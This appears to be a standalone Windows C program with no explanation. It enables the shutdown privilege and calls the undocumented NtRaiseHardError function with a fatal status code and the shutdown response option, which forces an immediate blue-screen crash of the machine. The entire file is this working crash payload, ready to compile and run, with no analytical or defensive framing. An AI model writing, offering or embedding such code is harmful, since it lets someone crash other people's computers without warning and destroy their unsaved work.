#include <windows.h>
#include <stdio.h>

typedef NTSTATUS (NTAPI *pNtRaiseHardError)(
    NTSTATUS ErrorStatus,
    ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters,
    ULONG ResponseOption,
    PULONG Response
);

void EnableShutdownPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    if (!OpenProcessToken(GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return;
    LookupPrivilegeValueA(NULL, "SeShutdownPrivilege",
        &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    CloseHandle(hToken);
}

int main() {
    EnableShutdownPrivilege();

    pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRaiseHardError");

    if (!NtRaiseHardError) {
        printf("You have got Error, NtRaiseHardError\n");
        return 1;
    }

    ULONG Response;
    NtRaiseHardError(
        0xC000021A,
        0, 0, NULL,
        6,
        &Response
    );

    return 0;
}
